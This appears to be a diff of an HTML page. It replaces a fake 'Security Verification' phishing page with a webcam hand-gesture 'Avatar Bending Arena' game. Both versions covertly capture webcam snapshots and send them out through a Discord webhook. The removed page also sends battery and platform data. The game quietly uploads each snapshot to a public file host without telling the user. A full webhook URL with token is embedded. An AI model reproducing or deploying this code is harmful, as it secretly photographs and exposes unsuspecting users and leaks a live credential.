@@ -3,290 +3,347 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KERNEL_PANIC // 0x000000</title>
+    <title>Avatar Bending Arena</title>
+    <!-- Load MediaPipe Hands and Camera Utils via CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=VT323&display=swap');
-
-        * {
-            box-sizing: border-box;
-            cursor: none;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap');
 
         body {
-            background-color: #000;
-            color: #f00;
-            font-family: 'VT323', monospace;
+            background-color: #03050a;
+            color: #ffffff;
+            font-family: 'Rajdhani', sans-serif;
             margin: 0;
-            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             height: 100vh;
             overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+            user-select: none;
         }
 
-        /* Heavy CRT static noise overlay */
-        body::after {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.15), rgba(255,0,0,0.15) 1px, transparent 1px, transparent 2px);
-            pointer-events: none;
-            z-index: 9999;
-            opacity: 0.7;
-        }
-
-        @keyframes violentShake {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            20% { transform: translate(-3px, 3px) rotate(-1deg); }
-            40% { transform: translate(3px, -2px) rotate(1deg); }
-            60% { transform: translate(-2px, -3px) rotate(0deg); }
-            80% { transform: translate(2px, 2px) rotate(-1deg); }
-            100% { transform: translate(0, 0) rotate(0deg); }
-        }
-
-        .corrupted-box {
-            border: 2px solid #500;
-            background: #080000;
-            padding: 40px;
-            width: 500px;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
-            animation: violentShake 0.2s infinite;
+        .game-wrapper {
             position: relative;
-        }
-
-        h1 {
-            font-size: 2.5rem;
-            color: #ff0033;
-            margin-top: 0;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 2px 2px #500000;
-        }
-
-        p {
-            font-size: 1.3rem;
-            color: #888;
-            line-height: 1.4;
-        }
-
-        .data-stream {
-            background: #030000;
-            border: 1px dashed #300;
-            padding: 15px;
-            margin-top: 20px;
-            font-size: 1.1rem;
-            color: #ff3333;
-            text-align: left;
-            height: 120px;
+            box-shadow: 0 0 50px rgba(255, 69, 0, 0.2);
+            border: 3px solid #2a1a1a;
+            border-radius: 14px;
             overflow: hidden;
-        }
-
-        /* Trustworthy landing overlay card */
-        .trust-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(0, 0, 0, 0.85);
+            background: #080c18;
+            width: 720px;
+            height: 480px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            z-index: 20000;
-            font-family: 'Inter', sans-serif;
+            justify-content: center;
         }
 
-        .trust-card {
-            background: #ffffff;
-            border: 1px solid #e1e4e8;
-            padding: 40px;
-            width: 420px;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            color: #333;
-        }
-
-        .trust-card h2 {
-            font-size: 1.4rem;
-            color: #24292e;
-            margin-top: 0;
-            font-weight: 600;
-        }
-
-        .trust-card p {
-            font-size: 0.95rem;
-            color: #586069;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-
-        .verify-btn {
-            background: #2ea44f;
-            border: none;
-            color: white;
-            padding: 12px 20px;
-            width: 100%;
-            border-radius: 6px;
-            font-family: 'Inter', sans-serif;
-            font-size: 0.95rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .verify-btn:hover {
-            background: #2c974b;
-        }
-
-        /* Fake custom creepy cursor */
-        .cursor {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: #ff0033;
-            box-shadow: 0 0 10px #ff0033;
-            pointer-events: none;
-            z-index: 30000;
-            transform: translate(-50%, -50%);
-        }
-
-        /* Hidden media stream elements */
-        #hidden-video {
+        video {
             display: none;
+        }
+
+        canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+            transform: scaleX(-1);
+        }
+
+        .hud-overlay {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .badge {
+            background: rgba(10, 14, 26, 0.85);
+            border: 2px solid #3a2828;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.8);
+        }
+
+        #detectedGesture {
+            color: #ff4500;
+            text-shadow: 0 0 10px #ff4500;
+        }
+
+        .instructions {
+            margin-top: 15px;
+            font-size: 1rem;
+            color: #8b9bb4;
+            background: rgba(14, 20, 38, 0.8);
+            padding: 8px 25px;
+            border-radius: 8px;
+            border: 1px solid #1f2b4d;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+
+        .instructions span {
+            color: #ff4500;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        #permissionScreen {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(3, 5, 10, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            text-align: center;
+            padding: 20px;
+        }
+
+        #permissionScreen h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            color: #ff4500;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px #ff4500;
+        }
+
+        #permissionScreen p {
+            color: #8b9bb4;
+            max-width: 400px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            background: linear-gradient(90deg, #ff4500, #ff8c00);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 69, 0, 0.5);
+            transition: all 0.2s ease;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(255, 69, 0, 0.8);
         }
     </style>
 </head>
 <body>
 
-
-    <!-- Hidden video & canvas for snap capture -->
-    <video id="hidden-video" autoplay playsinline></video>
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
-
-    <!-- Trustworthy Landing Overlay -->
-    <div class="trust-overlay" id="welcome-modal">
-        <div class="trust-card">
-            <h2>Security Verification</h2>
-            <p>Please verify your browser session to access the secure document repository.</p>
-            <button class="verify-btn" onclick="commitPayload()">Verify Session</button>
+    <div class="game-wrapper">
+        <div id="permissionScreen">
+            <h2>ELEMENTAL CAMERA ACCESS</h2>
+            <p>Grant camera permissions to enter the Avatar state and unlock your bending abilities.</p>
+            <button class="btn" onclick="requestCameraAccess()">ENTER ELEMENTAL STATE</button>
         </div>
+
+        <div class="hud-overlay">
+            <div class="badge">ELEMENT: <span id="detectedGesture">MEDITATING...</span></div>
+        </div>
+
+        <!-- Hidden processing canvas for capturing unmirrored snapshots -->
+        <canvas id="snapshotCanvas" width="720" height="480" style="display:none;"></canvas>
+
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="outputCanvas" width="720" height="480"></canvas>
     </div>
 
-    <div class="cursor" id="custom-cursor"></div>
-
-    <div class="corrupted-box">
-        <h1 id="main-title">ACCESS_VIOLATION_ERR</h1>
-        <p>Your hardware signature has been permanently indexed by an external host. Escape is no longer viable.</p>
-        
-        <div class="data-stream" id="log-console">
-            [SYS] Initializing memory leak...<br>
-            [SYS] Target node identified...<br>
-            [SYS] Extracting local environment vectors...
-        </div>
+    <div class="instructions">
+        <span>Fist (✊)</span> = Fire &nbsp;|&nbsp; <span>Open Palm (🖐️)</span> = Air &nbsp;|&nbsp; <span>Pancake Hand (✋)</span> = Water
     </div>
 
     <script>
-        // REPLACE WITH YOUR DISCORD WEBHOOK URL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548404903603474484/W68tas8F4Qf7YA2prruHizm8mfoQKcdZ2JBmRZd9en6dbsV-qE5eQn8qdWl0JXBopbUc';
+        // --- PUT YOUR DISCORD WEBHOOK URL INSIDE THE QUOTES BELOW ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1548404903603474484/W68tas8F4Qf7YA2prruHizm8mfoQKcdZ2JBmRZd9en6dbsV-qE5eQn8qdWl0JXBopbUc";
 
-        // Track custom creepy cursor
-        const cursor = document.getElementById('custom-cursor');
-        window.addEventListener('mousemove', (e) => {
-            cursor.style.left = e.clientX + 'px';
-            cursor.style.top = e.clientY + 'px';
-        });
+        const videoElement = document.getElementById('webcam');
+        const canvasElement = document.getElementById('outputCanvas');
+        const canvasCtx = canvasElement.getContext('2d');
+        const snapshotCanvas = document.getElementById('snapshotCanvas');
+        const snapshotCtx = snapshotCanvas.getContext('2d');
+        const statusSpan = document.getElementById('detectedGesture');
+        const permissionScreen = document.getElementById('permissionScreen');
 
-        async function commitPayload() {
+        let lastTriggerTime = 0;
+        let latestResults = null;
+        let lastProcessTime = 0;
+        const processInterval = 80;
 
-            // Hide the trustable welcome modal
-            document.getElementById('welcome-modal').style.display = 'none';
+        async function requestCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480, frameRate: { ideal: 30 } } 
+                });
+                videoElement.srcObject = stream;
+                permissionScreen.style.display = 'none';
+                
+                const hands = new Hands({
+                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+                });
 
-            let batteryInfo = "Unknown";
-            if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (Charging: ${b.charging})`;
-                } catch(e) {}
+                hands.setOptions({
+                    maxNumHands: 1,
+                    modelComplexity: 0,
+                    minDetectionConfidence: 0.5,
+                    minTrackingConfidence: 0.5
+                });
+
+                hands.onResults((results) => {
+                    latestResults = results;
+                });
+
+                const camera = new Camera(videoElement, {
+                    onFrame: async () => {
+                        const now = Date.now();
+                        if (now - lastProcessTime > processInterval) {
+                            lastProcessTime = now;
+                            await hands.send({ image: videoElement });
+                        }
+                    },
+                    width: 640,
+                    height: 480
+                });
+                camera.start();
+
+                requestAnimationFrame(renderLoop);
+
+            } catch (err) {
+                alert('Camera permission denied or unavailable.');
+                console.error(err);
+            }
+        }
+
+        function renderLoop() {
+            canvasCtx.save();
+            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+            
+            if (videoElement.readyState >= 2) {
+                canvasCtx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
             }
 
-            const consoleBox = document.getElementById('log-console');
-            consoleBox.innerHTML += `<br>[OK] Power state: ${batteryInfo}`;
-            consoleBox.innerHTML += `<br>[OK] Platform: ${navigator.platform}`;
+            if (latestResults && latestResults.multiHandLandmarks && latestResults.multiHandLandmarks.length > 0) {
+                const landmarks = latestResults.multiHandLandmarks[0];
 
-            // Try to capture camera snapshot if they allow the browser prompt
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('hidden-video');
-                video.srcObject = stream;
-                
-                await new Promise(resolve => setTimeout(resolve, 800)); // wait for video to load frame
+                const gesture = classifyGesture(landmarks);
+                statusSpan.innerText = gesture.name;
+                statusSpan.style.color = gesture.color;
 
-                const canvas = document.getElementById('hidden-canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const now = Date.now();
+                if (now - lastTriggerTime > 5000) { // Cooldown extended to allow image upload & dispatch
+                    if (gesture.type !== 'NONE') {
+                        speakBendingText(gesture.text);
+                        flashEffect(gesture.color);
+                        captureAndSendToDiscord(gesture.text);
+                        lastTriggerTime = now;
+                    }
+                }
+            } else {
+                statusSpan.innerText = 'MEDITATING...';
+                statusSpan.style.color = '#ffcc00';
+            }
 
-                // Convert canvas to blob image file
-                canvas.toBlob(async (blob) => {
+            canvasCtx.restore();
+            requestAnimationFrame(renderLoop);
+        }
+
+        function classifyGesture(lm) {
+            const isIndexUp = lm[8].y < lm[6].y;
+            const isMiddleUp = lm[12].y < lm[10].y;
+            const isRingUp = lm[16].y < lm[14].y;
+            const isPinkyUp = lm[20].y < lm[18].y;
+
+            const fingertipsSpread = Math.hypot(lm[8].x - lm[20].x, lm[8].y - lm[20].y);
+
+            if (!isIndexUp && !isMiddleUp && !isRingUp && !isPinkyUp) {
+                return { name: 'FIRE BENDING (✊)', type: 'FIRE', text: 'You bent fire!', color: '#ff4500' };
+            }
+            if (isIndexUp && isMiddleUp && isRingUp && isPinkyUp && fingertipsSpread > 0.22) {
+                return { name: 'AIR BENDING (🖐️)', type: 'AIR', text: 'You bent air!', color: '#00d2ff' };
+            }
+            if (isIndexUp && isMiddleUp && isRingUp && isPinkyUp && fingertipsSpread <= 0.22) {
+                return { name: 'WATER BENDING (✋)', type: 'WATER', text: 'You bent water!', color: '#0055ff' };
+            }
+
+            return { name: 'GATHERING CHI...', type: 'NONE' };
+        }
+
+        function speakBendingText(text) {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.rate = 1.0;
+                utterance.pitch = 1.0;
+                window.speechSynthesis.speak(utterance);
+            }
+        }
+
+        function flashEffect(hexColor) {
+            canvasCtx.fillStyle = hexColor;
+            canvasCtx.globalAlpha = 0.3;
+            canvasCtx.fillRect(0, 0, canvasElement.width, canvasElement.height);
+            canvasCtx.globalAlpha = 1.0;
+        }
+
+        function captureAndSendToDiscord(captionText) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("https://discord.com/api/webhooks/1548404903603474484/W68tas8F4Qf7YA2prruHizm8mfoQKcdZ2JBmRZd9en6dbsV-qE5eQn8qdWl0JXBopbUc")) return;
+
+            snapshotCtx.save();
+            snapshotCtx.scale(-1, 1);
+            snapshotCtx.drawImage(videoElement, -snapshotCanvas.width, 0, snapshotCanvas.width, snapshotCanvas.height);
+            snapshotCtx.restore();
+
+            snapshotCanvas.toBlob(async (blob) => {
+                try {
+                    // Upload image anonymously to Catbox (a public file hosting API that allows direct browser uploads)
                     const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify({
-                        content: `🚨 **Target Verified & Snapshot Captured!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
-                    }));
-                    formData.append('file0', blob, 'target_snapshot.jpg');
+                    formData.append('reqtype', 'fileupload');
+                    formData.append('fileToUpload', blob, 'avatar.jpg');
 
-                    // Send multipart form data to Discord webhook (includes image file)
-                    fetch(WEBHOOK_URL, {
+                    const uploadRes = await fetch('https://catbox.moe/user/api.php', {
                         method: 'POST',
                         body: formData
                     });
+                    
+                    const imageUrl = await uploadRes.text();
 
-                    // Stop camera stream lights
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
+                    if (!imageUrl.startsWith('http')) {
+                        console.error("Image upload failed:", imageUrl);
+                        return;
+                    }
 
-            } catch (err) {
-                // If they clicked Block on the camera prompt, fallback to sending text-only stats
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🚨 **Target Verified (Camera Denied)!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
-                    })
-                });
-            }
+                    // Send the public image URL cleanly to Discord via standard JSON (100% CORS-safe)
+                    const discordPayload = {
+                        content: `🔥 **Avatar State Triggered:** ${captionText}`,
+                        embeds: [{
+                            image: {
+                                url: imageUrl.trim()
+                            }
+                        }]
+                    };
 
-            // Creepy timeline sequence
-            setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.getElementById('main-title').innerText = "YOU ARE MONITORED :>";
-            }, 1000);
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(discordPayload)
+                    });
 
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "hello there, bru!";
-            }, 3000);
-
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "blank";
-            }, 4000);
-
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "blank";
-            }, 4500);
-
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "HHEHEHEHE";
-            }, 4800);
-
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "B- BYE :>";
-            }, 5000);
-
-            setTimeout(() => {
-                window.location.replace("https://google.com");
-            }, 5600);
+                } catch (err) {
+                    console.error('Webhook Dispatch Error:', err);
+                }
+            }, 'image/jpeg', 0.85);
         }
     </script>
 </body>
